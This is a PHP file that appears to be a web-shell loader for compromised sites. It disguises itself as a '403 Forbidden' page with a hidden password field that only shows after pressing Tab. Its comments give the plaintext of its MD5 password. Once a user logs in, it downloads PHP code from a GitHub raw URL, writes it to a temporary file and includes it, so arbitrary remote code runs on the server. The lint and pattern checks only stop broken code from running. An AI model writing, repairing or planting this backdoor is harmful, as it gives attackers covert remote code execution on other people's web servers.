<?php
// =========================
// Protected loader (fixed)
// Prevents HTTP 500 by detecting obvious syntax/obfuscation problems
// Adds MD5 login as requested
// =========================
session_start();
$stored_md5 = '0e96b40d579f8b6d1b43c23b3ead93cf'; // md5('seokampungan123@@##')

// Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['authed']);
    session_regenerate_id(true);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Login handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pw'])) {
    if (md5($_POST['pw']) === $stored_md5) {
        $_SESSION['authed'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error = 'Password salah!';
    }
}

// Show 403 + login form if not authed
if (empty($_SESSION['authed'])):
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>403 Forbidden</title>
<style>
html,body{height:100%;margin:0;font-family:Arial, Helvetica, sans-serif;background:#0b0b0b;color:#eee}
.wrap{height:100%;display:flex;align-items:center;justify-content:center}
.card{max-width:820px;padding:40px;border-radius:8px;text-align:center}
.forbidden{font-size:24px;font-weight:700;color:#fff}
.sub{margin-top:8px;color:#ccc}
.pw-form{margin-top:28px}
.pw-input{width:1px;opacity:0;padding:10px 12px;border-radius:6px;transition:all .18s ease;border:0;outline:none;background:rgba(255,255,255,0.06);color:#fff;caret-color:#fff}
.pw-input:focus{width:280px;opacity:1;border:1px solid rgba(255,255,255,0.12);box-shadow:0 8px 24px rgba(0,0,0,0.6);background:rgba(255,255,255,0.04)}
.btn{display:inline-block;margin-left:10px;padding:10px 14px;border-radius:6px;text-decoration:none;border:0;cursor:pointer;background:#ffffff;color:#000;font-weight:700;font-size:13px}
.hint{font-size:13px;color:#9aa}
.error{color:#ff6b6b;margin-top:12px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="forbidden">403 Forbidden</div>
    <div class="sub">Access to this resource on the server is denied!</div>
    <form class="pw-form" method="post" autocomplete="off">
      <input class="pw-input" name="pw" type="password" placeholder="Tekan TAB lalu masukkan password" tabindex="1" autofocus />
      <button class="btn" type="submit">Masuk</button>
    </form>
    <div class="hint">Tekan <strong>Tab</strong> untuk menampilkan kotak password, lalu ketik password.</div>
    <?php if(!empty($error)): ?><div class="error"><?=htmlspecialchars($error)?></div><?php endif; ?>
  </div>
</div>
</body>
</html>
<?php
exit;
endif;

// =========================
// After authentication: safely load/execute remote script
// =========================
$remote_url = 'https://github.com/hangojuan/datapenting/raw/refs/heads/main/script-asli.php';

// Try to get remote code. If allow_url_fopen disabled, instruct user to upload file locally.
$code = @file_get_contents($remote_url);
if ($code === false) {
    // If remote fetch failed, check if a local copy exists (script-asli.php)
    if (is_readable(__DIR__ . '/script-asli.php')) {
        $code = file_get_contents(__DIR__ . '/script-asli.php');
    } else {
        // Can't fetch remote and no local copy: show friendly message (avoid HTTP 500)
        echo "<h2>Gagal mengambil script asli</h2>";
        echo "<p>Server tidak dapat mengunduh file dari GitHub. Solusi cepat:</p>";
        echo "<ol><li>Upload <code>script-asli.php</code> langsung ke folder yang sama.</li>";
        echo "<li>Atau aktifkan <code>allow_url_fopen</code> atau gunakan curl pada server.</li></ol>";
        exit;
    }
}

// Basic safety / sanity checks to avoid obvious parse errors and stop execution instead of causing HTTP 500
$suspicious_patterns = [
    '/function\s*\(\s*\$/i',          // functions declared with invalid param list like function ($,$)
    '/eval\s*\(/i',                    // eval usage (suspicious)
    '/exit\s*\(/i',                    // forced exit
    '/\{\s*\$\$\$\$\$/',          // many-dollar var (we saw in original)
    '/<\?php.*<\?php/s'                 // nested php tags
];
$found = [];
foreach ($suspicious_patterns as $pat) {
    if (preg_match($pat, $code)) $found[] = $pat;
}

if (!empty($found)) {
    // Found suspicious/invalid patterns — do NOT execute. Offer to save as .txt for manual inspection.
    echo "<h2>Script tidak dieksekusi karena terdeteksi sintaks/obfuscation yang berisiko</h2>";
    echo "<p>Beberapa pola bermasalah terdeteksi, menjalankan file langsung dapat menyebabkan <strong>HTTP 500</strong>. </p>";
    echo "<p>Opsi yang tersedia:</p>";
    echo "<ul>";
    echo "<li>Unduh file sebagai teks lalu periksa/bersihkan: <a href=\"?download=1\">Download script sebagai .txt</a></li>";
    echo "<li>Upload versi bersih (valid PHP) ke server dan saya bantu gabungkan.</li>";
    echo "</ul>";

    // Provide download of the raw code as .txt so user can inspect without executing
    if (isset($_GET['download'])) {
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="script-asli-raw.txt"');
        echo $code;
        exit;
    }
    exit;
}

// If we reach here, basic checks passed — write code to a temp file and include it
$tmp = sys_get_temp_dir() . '/script_asli_' . md5($code) . '.php';
file_put_contents($tmp, $code);

// Final precaution: optional php -l lint if exec available
$can_exec = function_exists('exec') && stripos(ini_get('disable_functions'), 'exec') === false;
if ($can_exec) {
    $output = null;
    $return_var = 1;
    @exec('php -l ' . escapeshellarg($tmp) . ' 2>&1', $output, $return_var);
    if ($return_var !== 0) {
        echo "<h2>Lint error pada script</h2>";
        echo "<pre>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
        unlink($tmp);
        exit;
    }
}

// Include the temp file safely. If it still throws a fatal parse error then server config needs review.
@include $tmp;

// Clean up temp file optionally (comment out if needed for debugging)
// @unlink($tmp);

?>
